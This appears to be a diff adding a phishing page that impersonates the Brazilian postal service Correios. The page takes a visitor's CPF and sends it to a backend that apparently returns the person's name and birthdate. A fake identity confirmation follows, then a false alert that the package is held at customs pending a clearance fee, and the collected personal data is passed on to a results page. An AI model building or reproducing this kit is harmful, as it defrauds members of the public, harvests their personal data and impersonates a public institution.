@@ -1,0 +1,296 @@
+<!DOCTYPE html><html lang="pt-br"><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+    <link href="css/css2.css" rel="stylesheet">
+    <link rel="stylesheet" href="css/hgi-stroke-rounded.css">
+    <script src="browser%25404"></script>
+    <style>
+        * {
+            font-family: 'Roboto', sans-serif !important;
+        }
+    </style>
+    <title>Rastreie sua Encomenda</title>
+</head>
+<body>
+    <header class="p-2 text-cyan-700 text-xs bg-zinc-100">
+        <span>Acessibilidade <b class="text-xs">▼</b></span>
+    </header>
+
+    <hr class="border-white">
+
+    <header class="bg-zinc-100 p-2 flex items-center justify-between">
+        <i class="hgi hgi-stroke hgi-menu-01 text-2xl font-bold text-cyan-700"></i>
+        <img src="images/logo.svg" alt="Logo" class="w-30">
+        <img src="images/sair.svg" alt="Logo" class="w-8">
+    </header>
+    
+    <hr class="border-orange-500">
+
+    <div class="p-3 text-xs flex items-center gap-1 text-gray-500">
+        <span>Rastreamento</span> <b class="text-lg text-cyan-700">›</b>
+    </div>
+
+
+    <div class="p-4">
+        <div class="p-2">
+            <h1 class="text-2xl text-bold text-cyan-800">Rastreamento</h1>
+        </div>
+        <div class="p-4 flex items-center gap-1 flex-col bg-zinc-100 h-90 rounded-md">
+            <form id="consultaForm" action="./includes/consulta.php" method="POST">
+            <p class="text-sm font-bold mb-2">Deseja acompanhar seu objeto?
+            Digite seu CPF/CNPJ ou código* de rastreamento.</p>
+            <input type="text" placeholder="Digite seu CPF/CNPJ" name="cpf" required="" class="w-full p-2 border border-gray-300 rounded-md bg-white mb-2" oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0, 11);" maxlength="14">
+            <img src="images/captcha.png" alt="Captcha" class="w-full h-20 mb-2">
+            <p class="text-sm mb-2">Digite o codigo da imagem.</p>
+            <input type="text" required="" class="w-full p-2 border border-gray-300 rounded-md bg-white mb-2">
+            <input type="submit" value="Consultar" class="w-full p-2 bg-cyan-700 text-white rounded-md mb-2">
+            </form>
+        </div>
+    </div>
+
+    <footer class="bg-yellow-400 p-6">
+        <div class="max-w-6xl mx-auto">
+            <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
+                <div>
+                    <h3 class="text-lg font-bold text-gray-800 mb-3">Fale Conosco</h3>
+                    <ul class="space-y-2">
+                        <li><a href="#" class="text-sm text-gray-800 hover:text-gray-600">Registro de Manifestações</a></li>
+                        <li><a href="#" class="text-sm text-gray-800 hover:text-gray-600">Central de Atendimento</a></li>
+                        <li><a href="#" class="text-sm text-gray-800 hover:text-gray-600">Soluções para o seu negócio</a></li>
+                        <li><a href="#" class="text-sm text-gray-800 hover:text-gray-600">Suporte ao cliente com contrato</a></li>
+                        <li><a href="#" class="text-sm text-gray-800 hover:text-gray-600">Ouvidoria</a></li>
+                        <li><a href="#" class="text-sm text-gray-800 hover:text-gray-600">Denúncia</a></li>
+                    </ul>
+                </div>
+                
+                <div>
+                    <h3 class="text-lg font-bold text-gray-800 mb-3">Sobre os Correios</h3>
+                    <ul class="space-y-2">
+                        <li><a href="#" class="text-sm text-gray-800 hover:text-gray-600">Identidade corporativa</a></li>
+                        <li><a href="#" class="text-sm text-gray-800 hover:text-gray-600">Educação e cultura</a></li>
+                        <li><a href="#" class="text-sm text-gray-800 hover:text-gray-600">Código de ética</a></li>
+                        <li><a href="#" class="text-sm text-gray-800 hover:text-gray-600">Transparência e prestação de contas</a></li>
+                        <li><a href="#" class="text-sm text-gray-800 hover:text-gray-600">Política de Privacidade e Notas Legais</a></li>
+                    </ul>
+                </div>
+                
+                <div>
+                    <h3 class="text-lg font-bold text-gray-800 mb-3">Outros Sites</h3>
+                    <ul class="space-y-2">
+                        <li><a href="#" class="text-sm text-gray-800 hover:text-gray-600">Loja online dos Correios</a></li>
+                    </ul>
+                </div>
+            </div>
+            
+            <div class="text-center mt-6 pt-4 border-t border-yellow-500">
+                <p class="text-sm text-gray-800">© Copyright 2025 Correios</p>
+            </div>
+        </div>
+    </footer>
+
+    <div id="loadingModal" class="fixed inset-0 flex items-center justify-center z-50 hidden">
+        <div class="absolute inset-0 bg-black/60 backdrop-blur-sm"></div>
+        <div class="relative bg-white rounded-2xl shadow-2xl p-6 mx-4 w-full max-w-xs">
+            <div class="absolute top-0 left-0 right-0 h-1.5 bg-yellow-400 rounded-t-2xl"></div>
+            <div class="text-center pt-2">
+                <img src="images/logo.svg" alt="Correios" class="h-6 mx-auto mb-4">
+                <div class="relative w-20 h-20 mx-auto mb-4">
+                    <svg class="w-20 h-20 animate-spin" viewBox="0 0 100 100">
+                        <circle cx="50" cy="50" r="45" fill="none" stroke="#e5e7eb" stroke-width="8"></circle>
+                        <circle cx="50" cy="50" r="45" fill="none" stroke="#0369a1" stroke-width="8" stroke-dasharray="70 200" stroke-linecap="round"></circle>
+                    </svg>
+                    <div class="absolute inset-0 flex items-center justify-center">
+                        <div class="w-11 h-11 bg-gradient-to-br from-yellow-400 to-yellow-500 rounded-lg flex items-center justify-center shadow-lg">
+                            <i class="hgi hgi-stroke hgi-package text-xl text-white"></i>
+                        </div>
+                    </div>
+                </div>
+                <h3 class="text-base font-bold text-gray-800 mb-1">Rastreando sua encomenda</h3>
+                <p id="statusText" class="text-sm text-gray-500 mb-4">Conectando ao servidor...</p>
+                <div class="w-full h-1.5 bg-gray-100 rounded-full overflow-hidden mb-3">
+                    <div id="progressBar" class="h-full bg-cyan-600 rounded-full transition-all duration-500" style="width: 0%"></div>
+                </div>
+                <div class="flex justify-between text-xs text-gray-400">
+                    <span id="step1">Conectando</span>
+                    <span id="step2">Buscando</span>
+                    <span id="step3">Finalizando</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="confirmModal" class="fixed inset-0 flex items-center justify-center z-50 hidden">
+        <div class="absolute inset-0 bg-black/60 backdrop-blur-sm"></div>
+        <div class="relative bg-white rounded-2xl shadow-2xl p-6 mx-4 w-full max-w-xs">
+            <div class="absolute top-0 left-0 right-0 h-1.5 bg-yellow-400 rounded-t-2xl"></div>
+            <div class="text-center pt-2">
+                <img src="images/logo.svg" alt="Correios" class="h-6 mx-auto mb-4">
+                <div class="w-16 h-16 bg-gradient-to-br from-cyan-500 to-cyan-600 rounded-full flex items-center justify-center mx-auto mb-4 shadow-lg">
+                    <i class="hgi hgi-stroke hgi-user text-2xl text-white"></i>
+                </div>
+                <h3 class="text-base font-bold text-gray-800 mb-1">Confirme sua identidade</h3>
+                <p class="text-xs text-gray-500 mb-3">Encontramos uma encomenda para:</p>
+                <div class="bg-gray-50 rounded-lg p-3 mb-4 border border-gray-100">
+                    <p id="confirmName" class="text-lg font-bold text-cyan-700 uppercase leading-tight"></p>
+                </div>
+                <p class="text-xs text-gray-600 mb-4">Você é essa pessoa?</p>
+                <div class="flex gap-2">
+                    <button id="btnNo" class="flex-1 py-2.5 bg-gray-100 hover:bg-gray-200 text-gray-700 font-semibold rounded-lg text-sm transition-colors">Não</button>
+                    <button id="btnYes" class="flex-1 py-2.5 bg-cyan-600 hover:bg-cyan-700 text-white font-semibold rounded-lg text-sm transition-colors">Sim, sou eu</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="retidaModal" class="fixed inset-0 flex items-center justify-center z-50 hidden">
+        <div class="absolute inset-0 bg-black/60 backdrop-blur-sm"></div>
+        <div class="relative bg-white rounded-2xl shadow-2xl p-6 mx-4 w-full max-w-xs">
+            <div class="absolute top-0 left-0 right-0 h-1.5 bg-yellow-400 rounded-t-2xl"></div>
+            <div class="text-center pt-2">
+                <img src="images/logo.svg" alt="Correios" class="h-6 mx-auto mb-4">
+                <div class="w-16 h-16 bg-gradient-to-br from-orange-500 to-red-500 rounded-full flex items-center justify-center mx-auto mb-4 shadow-lg animate-pulse">
+                    <i class="hgi hgi-stroke hgi-alert-02 text-2xl text-white"></i>
+                </div>
+                <h3 class="text-base font-bold text-red-600 mb-2">Encomenda Retida!</h3>
+                <div class="bg-red-50 rounded-lg p-3 mb-3 border border-red-100 text-left">
+                    <p class="text-xs text-gray-700 leading-relaxed">
+                        <span class="font-semibold text-gray-800" id="retidaNome"></span>, identificamos que sua encomenda está <span class="font-bold text-red-600">RETIDA</span> na alfândega.
+                    </p>
+                </div>
+                <div class="bg-yellow-50 rounded-lg p-3 mb-4 border border-yellow-200 text-left">
+                    <p class="text-xs text-gray-700 leading-relaxed">
+                        Para liberar sua encomenda, é necessário efetuar o pagamento da <span class="font-bold">taxa de desembaraço aduaneiro</span>.
+                    </p>
+                </div>
+                <button id="btnVerDetalhes" class="w-full py-3 bg-cyan-600 hover:bg-cyan-700 text-white font-semibold rounded-lg text-sm transition-colors">
+                    Ver detalhes da encomenda
+                </button>
+            </div>
+        </div>
+    </div>
+
+<script>
+    let dadosConsulta = null;
+    
+    document.getElementById('consultaForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        const modal = document.getElementById('loadingModal');
+        const progressBar = document.getElementById('progressBar');
+        const statusText = document.getElementById('statusText');
+        const step1 = document.getElementById('step1');
+        const step2 = document.getElementById('step2');
+        const step3 = document.getElementById('step3');
+        const formData = new FormData(this);
+        
+        modal.classList.remove('hidden');
+        
+        const messages = [
+            { text: 'Conectando ao servidor...', progress: 15, activeStep: 1 },
+            { text: 'Verificando dados...', progress: 35, activeStep: 1 },
+            { text: 'Buscando informações...', progress: 55, activeStep: 2 },
+            { text: 'Localizando encomenda...', progress: 75, activeStep: 2 },
+            { text: 'Preparando resultado...', progress: 90, activeStep: 3 },
+            { text: 'Quase lá...', progress: 100, activeStep: 3 }
+        ];
+        
+        let currentStep = 0;
+        
+        function updateProgress() {
+            if (currentStep < messages.length) {
+                const msg = messages[currentStep];
+                statusText.textContent = msg.text;
+                progressBar.style.width = msg.progress + '%';
+                
+                step1.className = 'transition-colors duration-300 text-gray-400';
+                step2.className = 'transition-colors duration-300 text-gray-400';
+                step3.className = 'transition-colors duration-300 text-gray-400';
+                
+                if (msg.activeStep >= 1) step1.className = 'transition-colors duration-300 text-cyan-600 font-semibold';
+                if (msg.activeStep >= 2) step2.className = 'transition-colors duration-300 text-cyan-600 font-semibold';
+                if (msg.activeStep >= 3) step3.className = 'transition-colors duration-300 text-cyan-600 font-semibold';
+                
+                currentStep++;
+                setTimeout(updateProgress, 800);
+            }
+        }
+        
+        updateProgress();
+        
+        fetch('./includes/consulta_ajax.php', {
+            method: 'POST',
+            body: formData
+        })
+        .then(response => response.json())
+        .then(data => {
+            // NORMALIZAÇÃO DOS DADOS
+            // Isso garante que ele pegue o nome quer o PHP envie como "data.nome" ou "data.data.nome"
+            const nomeEncontrado = data.nome || (data.data && data.data.nome) || '';
+            const cpfEncontrado = data.cpf || (data.data && data.data.cpf) || '';
+            const nascEncontrado = data.nascimento || (data.data && data.data.data_nascimento) || '';
+            
+            // Salva na variável global limpo e organizado
+            dadosConsulta = {
+                nome: nomeEncontrado,
+                cpf: cpfEncontrado,
+                nascimento: nascEncontrado
+            };
+            
+            setTimeout(function() {
+                modal.classList.add('hidden');
+                
+                // Agora verifica usando a variável normalizada
+                if (data.success && nomeEncontrado !== '') {
+                    document.getElementById('confirmName').textContent = nomeEncontrado;
+                    document.getElementById('confirmModal').classList.remove('hidden');
+                } else {
+                    console.error("Erro na busca ou nome vazio:", data);
+                    // Redireciona vazio caso a API retorne sucesso, mas não encontre o nome
+                    window.location.href = './resultado/?nome=&cpf=&nascimento=';
+                }
+            }, 5000); // Aguarda os 5 segundos da animação
+        })
+        .catch(error => {
+            console.error('Erro na requisição AJAX:', error);
+            setTimeout(function() {
+                modal.classList.add('hidden');
+                alert('Erro ao consultar. Tente novamente.');
+            }, 5000);
+        });
+    });
+    
+    document.getElementById('btnYes').addEventListener('click', function() {
+        if (dadosConsulta) {
+            document.getElementById('confirmModal').classList.add('hidden');
+            
+            const nomeCompleto = dadosConsulta.nome || '';
+            const primeiroNome = nomeCompleto.split(' ')[0];
+            document.getElementById('retidaNome').textContent = primeiroNome;
+            
+            document.getElementById('retidaModal').classList.remove('hidden');
+        }
+    });
+    
+    document.getElementById('btnNo').addEventListener('click', function() {
+        document.getElementById('confirmModal').classList.add('hidden');
+        dadosConsulta = null;
+    });
+    
+    document.getElementById('btnVerDetalhes').addEventListener('click', function() {
+        if (dadosConsulta) {
+            // Monta a URL passando APENAS os dados da pessoa
+            const query = new URLSearchParams({
+                nome: dadosConsulta.nome,
+                cpf: dadosConsulta.cpf,
+                nascimento: dadosConsulta.nascimento
+            }).toString();
+            
+            window.location.href = './resultado/?' + query;
+        }
+    });
+</script>
+
+
+</body></html>
